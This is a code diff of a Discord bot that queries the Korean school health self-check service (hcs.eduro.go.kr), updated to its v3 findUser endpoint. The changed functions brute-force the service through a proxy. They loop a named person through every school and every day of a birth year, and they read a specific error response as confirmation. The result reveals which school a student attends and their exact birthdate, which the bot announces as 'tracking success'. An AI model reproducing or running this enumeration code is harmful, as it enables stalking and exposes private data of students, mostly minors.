@@ -60,6 +60,25 @@ let codes = {
     "경상남도": "gne",
     "제주특별자치도": "jje"
 };
+let lctnScCodes = {
+    "서울특별시": "01",
+    "부산광역시": "02",
+    "대구광역시": "03",
+    "인천광역시": "04",
+    "광주광역시": "05",
+    "대전광역시": "06",
+    "울산광역시": "07",
+    "세종특별자치시": "08",
+    "경기도": "10",
+    "강원도": "11",
+    "충청북도": "12",
+    "충청남도": "13",
+    "전라북도": "14",
+    "전라남도": "15",
+    "경상북도": "16",
+    "경상남도": "17",
+    "제주특별자치도": "18"
+};
 let headers = {
     "Connection": "keep-alive",
     "Accept": "application/json, text/plain, */*",
@@ -139,11 +158,13 @@ async function getSchool(name, birthday, region, special = false, interaction = 
             return all
         }, []); //chunk
         let currentPage = 0;
-        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
+        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
         if (!searchKey) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
+        let keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
         searchKeyInterval = setInterval(async () => {
-            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
+            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
             if (!!res) searchKey = res;
+            keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
         }, 90000); // hcs 서치 키 만료 시간: 2분
         for (chunk of orgList) {
             currentPage++;
@@ -152,30 +173,32 @@ async function getSchool(name, birthday, region, special = false, interaction = 
                 else interaction.editReply({ embeds: [new MessageEmbed().setColor("BLUE").setTitle(`🔍 검색 중... (페이지 ${currentPage}/${orgList.length})`)] });
             };
             await Promise.all(chunk.map(async (org) => {
-                // org = {
-                //     name: schools[schoolLevel][org].name,
-                //     region: schools[schoolLevel][org].region,
-                //     code: org
-                // };
-                let result = await axios.post(`https://${codes[org.region]}hcs.eduro.go.kr/v2/findUser`, {
-                    "orgCode": org.code,
-                    "name": encrypt(name),
+                let result = await axios.post(`https://${codes[org.region]}hcs.eduro.go.kr/v3/findUser`, {
                     "birthday": encrypt(birthday.join("")),
-                    "stdntPNo": null,
+                    "deviceUuid": "",
+                    "lctnScCode": lctnScCodes[org.region],
                     "loginType": "school",
-                    searchKey
+                    "makeSession": true,
+                    "name": encrypt(name),
+                    "orgCode": org.code,
+                    "orgName": org.name,
+                    "password": `{"raon":[{"id":"password","enc":"","hmac":"","keyboardType":"number","keyIndex":"${keyIndex}","fieldType":"password","seedKey":"","initTime":"${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}","ExE2E":"false"}]}`,
+                    "searchKey": searchKey,
+                    "stdntPNo": null
                 }, { proxy, headers, timeout: 10000 }).catch(err => { return err.response ? err.response : { status: "error", err } });
-                // result.status == "error" && console.log(result.err);
                 result = result && result.data;
-                if (!!result && !!result.orgName) {
-                    result.orgCode = org.code;
-                    result.scCode = codes[org.region];
-                    result.region = org.region;
-                    result.birthday = {
-                        text: `${Number(birthday[0]) + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
-                        year: Number(birthday[0]) + 2000,
-                        month: birthday[1],
-                        day: birthday[2]
+                if (!!result && result.isError && (result.message.includes("정상적인 조회가 아닙니다") || result.statusCode == 252)) {
+                    result = {
+                        orgName: org.name,
+                        orgCode: org.code,
+                        scCode: codes[org.region],
+                        region: org.region,
+                        birthday: {
+                            text: `${Number(birthday[0]) + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
+                            year: Number(birthday[0]) + 2000,
+                            month: birthday[1],
+                            day: birthday[2]
+                        }
                     };
                     s.push(result);
                     interaction && interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 트래킹 성공 (페이지 ${currentPage}/${orgList.length})`).setDescription(description += `\n**\`${result.region} ${result.orgName}\`**에서 **\`${name}\`**님의 정보를 찾았습니다! (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
@@ -222,7 +245,7 @@ client.on("ready", () => {
                     let channel = client.channels.cache.get(config.notifyChannels.hcsUpdate);
                     if (channel) {
                         await channel.bulkDelete(99);
-                        channel.send({content: `<@${config.owners[0]}>`, embeds: [new MessageEmbed().setTitle("HCS Update Notification").setDescription(`**HCS Client Updated.**\n\n**New version**: **\`${hcsClientVersion}\`**`).setColor("GREEN").setTimestamp()]});
+                        channel.send({ content: `<@${config.owners[0]}>`, embeds: [new MessageEmbed().setTitle("HCS Update Notification").setDescription(`**HCS Client Updated.**\n\n**New version**: **\`${hcsClientVersion}\`**`).setColor("GREEN").setTimestamp()] });
                     };
                 };
             } catch { };
@@ -292,11 +315,13 @@ async function getBirthdate(name, birthYear, school, interaction = null) {
         birthYear = birthYear.length <= 1 ? `0${birthYear}` : birthYear;
         if (schoolList.length < 1) throw new Error("학교를 다시 확인해 주세요");
         school = schoolList[0];
-        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
+        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
         if (!searchKey) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
+        let keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
         searchKeyInterval = setInterval(async () => {
-            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
+            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school", { proxy, headers, timeout: 10000 }).then(res => res.data.key).catch(e => "");
             if (!!res) searchKey = res;
+            keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
         }, 90000); // hcs 서치 키 만료 시간: 2분
         let description = "";
         let startedTime = Date.now();
@@ -311,22 +336,32 @@ async function getBirthdate(name, birthYear, school, interaction = null) {
                 else interaction.editReply({ embeds: [new MessageEmbed().setColor("BLUE").setTitle(`🔍 검색 중... (페이지 ${currentPage}/${monthDays.length})`)] });
             };
             await Promise.all(array.map(async day => {
-                let result = await axios.post(`https://${codes[school.region]}hcs.eduro.go.kr/v2/findUser`, {
-                    "orgCode": school.code,
-                    "name": encrypt(name),
+                let result = await axios.post(`https://${codes[school.region]}hcs.eduro.go.kr/v3/findUser`, {
                     "birthday": encrypt(`${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`),
-                    "stdntPNo": null,
+                    "deviceUuid": "",
+                    "lctnScCode": lctnScCodes[school.region],
                     "loginType": "school",
-                    searchKey
+                    "makeSession": true,
+                    "name": encrypt(name),
+                    "orgCode": school.code,
+                    "orgName": school.name,
+                    "password": `{"raon":[{"id":"password","enc":"","hmac":"","keyboardType":"number","keyIndex":"${keyIndex}","fieldType":"password","seedKey":"","initTime":"${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}","ExE2E":"false"}]}`,
+                    "searchKey": searchKey,
+                    "stdntPNo": null
                 }, { proxy, headers, timeout: 10000 }).catch(err => { return err.response ? err.response : { status: "error", err } });
-                // result.status == "error" && console.log(result.err);
                 result = result && result.data;
-                if (!!result && !!result.orgName) {
-                    result.birthday = {
-                        text: `${Number(birthYear) + 2000}년 ${month + 1}월 ${day}일`,
-                        year: Number(birthYear) + 2000,
-                        month: month + 1,
-                        day: day
+                if (!!result && result.isError && (result.message.includes("정상적인 조회가 아닙니다") || result.statusCode == 252)) {
+                    result = {
+                        orgName: school.name,
+                        orgCode: school.code,
+                        scCode: codes[school.region],
+                        region: school.region,
+                        birthday: {
+                            text: `${Number(birthYear) + 2000}년 ${month + 1}월 ${day}일`,
+                            year: Number(birthYear) + 2000,
+                            month: month + 1,
+                            day: day
+                        }
                     };
                     data.push(result);
                     interaction && interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 성공 (페이지 ${currentPage}/${monthDays.length})`).setDescription(description += `\n**\`${birthYear}년 ${month + 1}월 ${day}일\`** (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
